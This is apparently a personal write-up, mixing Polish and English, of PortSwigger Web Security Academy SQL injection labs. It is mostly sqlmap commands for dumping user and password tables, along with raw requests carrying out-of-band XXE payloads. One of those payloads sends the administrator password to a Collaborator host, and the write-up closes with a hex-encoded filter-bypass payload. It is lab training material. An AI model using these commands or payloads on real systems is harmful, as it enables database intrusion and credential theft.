
# sqlmap_portswigger
writeup pl/ang mix

Flags:
--fingerprint (for dmbs detection) <br>
–dbs (bazy danych, lepiej tego używać niż schema) <br>
-D public → wybór bazy <br>
-T users_odmlik → wybór tabeli <br>
--dump → pobranie danych <br>
--level (1–5) → ILE miejsc i technik sqlmap testuje (level=1 tylko oczywiste parametry (np. category, level=2 dodatkowe parametry, np. cookies (TrackingId ← ważne u Ciebie, level=5 wszystko, łącznie z rzadkimi nagłówkami i egzotycznymi payloadami) <br>
--risk (1–3) → JAK agresywne payloady są używane (risk=1 bezpieczne AND 1=1, proste warunki, risk=3 <br>
 ciężkie UNION, SUBSELECT, SLEEP, BENCHMARK) <br>
--threads=10    czyli sqlmap wali 10 requestów naraz → nonstop → bez przerw <br>
- throttling (celowe spowalnianie lub ograniczanie liczby żądań, które serwer akceptuje od jednego klienta w danym czasie.) - Serwer PortSwigger mówi: "OK, stop. Spowalniam / ignoruję część requestów" <br>
- rate limitong - server blokuje klienta po x requestach <br>
- AND must be type boolean czyli AND CAST zamieniam ma AND 1=CAST <br>
https://portswigger.net/web-security/sql-injection/cheat-sheet <br>
<br>
<br>

5. SQL injection attack, listing the database contents on non-Oracle databases<br>
<br>
Database engine detection:
<br>
<pre><code>sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhd" --batch </code></pre> <br>

--schema (enumerates database schema (databases, tables, columns)) <br>
Lepiej zacząć od --dbs, a --schema używać rzadko <br>
<br>
<pre><code> sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhd" --batch --dbms=PostgreSQL --schema </pre></code> <br>

User and Passowrd table display
<pre><code> sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhd" --batch --dbms=PostgreSQL -D public -T users_odmlik --dump
 </pre></code> <br>
<br>
<br>

11. Blind SQL injection with conditional errors <br>
<br>
<pre><code>sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcxb5p; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10</pre></code>
<br>
<br>
<pre><code>sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcx; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10 --dbms=Oracle --technique=B --users
 </pre></code>
<br>
<pre><code>sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcx; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10 --dbms=Oracle --technique=B -D Peter --tables
 </pre></code>
<br>
<pre><code>sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
  --cookie="session=Zu8T1AQ7R9BcrEPcx; TrackingId=Sy9B2w2HnGLDXX1J" \
  --random-agent \
  --level=2 --risk=1 \
  --batch --threads=10 --dbms=Oracle --technique=B -D Peter -T USERS --dump
 </pre></code>
<br>
<br>
--schema w Oracle + blind SQLi
To jest najgorsza możliwa kombinacja:
Oracle nie ma „baz danych” jak MySQL
<br>
<br>
ma SCHEMATY (users): SYS, SYSTEM, APP, itd.
<br>
<br>
flaga –users
 Wylistowania użytkowników bazy danych (DBMS users)
<br>
<br>
SYS, SYSTEM → systemowe (ignorujemy)
<br>
<br>
CTXSYS, XDB, MDSYS, OUTLN → systemowe
<br>
<br>
APEX_*, FLOWS_FILES → Oracle APEX
<br>
<br>
HR → schemat przykładowy Oracle
<br>
<br>
PETER → 👀 najbardziej podejrzany
<br>
<br>
12. Visible error-based SQL injection 
trzeba czytac errory w response
zaczac od ‘ nastepnie ‘--
<br>
<br>
13. Blind SQL injection with time delays
<br>
fingerprint database system
<br>
<pre><code>sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3Av; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \                     
  --level=2 --risk=1 \
  --batch --threads=10 --fingerprint
 </pre></code>
<br>
<br>
<pre><code>sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3Av; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
  --level=5 --risk=3 \
  --batch --threads=10 --dbms=PostgreSQL --dump </pre></code>
<br>
<br>
Database: public 
Table: users 
[3 entries] 

<pre><code>sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJ; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
  --level=5 --risk=3 \
  --batch --threads=10 --dbms=PostgreSQL --sql-query="SELECT username, password FROM users WHERE username='administrator'"
 </pre></code>
<br>
<br>
<br>
zebay zaliczyc, trzeba  opoznic atak o 10 sekund
<br>
<pre><code>sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJ; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
  --level=5 --risk=3 \
  --batch --threads=10 --dbms=PostgreSQL --sql-query="SELECT username, password FROM users WHERE username='administrator'" --technique=T --time-sec=10
 </pre></code>
<br>
<br>

14. Blind SQL injection with time delays and information retrieval
<br>
tip: w time-based usunac watki bo opoznienia sie mieszkaja
<br>
Ważne doprecyzowanie (PostgreSQL)
W PostgreSQL:
nie ma „baz danych” w tym sensie co w MySQL
<br>
<br>
sqlmap używa pojęcia database, ale technicznie:
<br>
<br>
public = schema
<br>
<br>
users, tracking = tabele w schemacie public
<br>
<br>
<pre><code>sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTi; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5 </pre></code>
<br>
<pre><code>sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTi; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5 --dbms=PostgreSQL –dump  </pre></code>
<br>
<br>

15. Blind SQL injection with out-of-band interaction
<br>
tip: out of band beda z uzyciem kolaboratora
<br>
<br>
burp pro
<br>
<pre><code>GET /filter?category=Gifts HTTP/2
Host: 0af1006c03847b7680fa038600540016.web-security-academy.net
Cookie: TrackingId=fspJHklzpGupi3MM'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"https%3a//webhook.site/aaeb8254-b290-426e-9985-d900d53473e2">+%25remote%3b]>'),'/l')+FROM+dual--
; session=a8c8mvvuugvboadppmgjrc19dwd1o4tw: 
 </pre></code>
<br>
<br>
payload stad:
https://portswigger.net/web-security/sql-injection/cheat-sheet
<br>
<br>

16. Blind SQL injection with out-of-band data exfiltration
payload
<br>
<pre><code>TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual-- </pre></code>
<br>
<br>
17. SQL injection with filter bypass via XML encoding
<br>
dopisalam w url stockId
<br>
/product?productId=1&stockId=London 

<br>
<br>
nastepnie mam request w proxy
<br>
POST /product/stock HTTP/2
<br>
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
<br>
<br>

payload > storeId
<br>
<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>
<br>
<br>
payload w hex
<br>
```&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;"```
 <br>
<br>















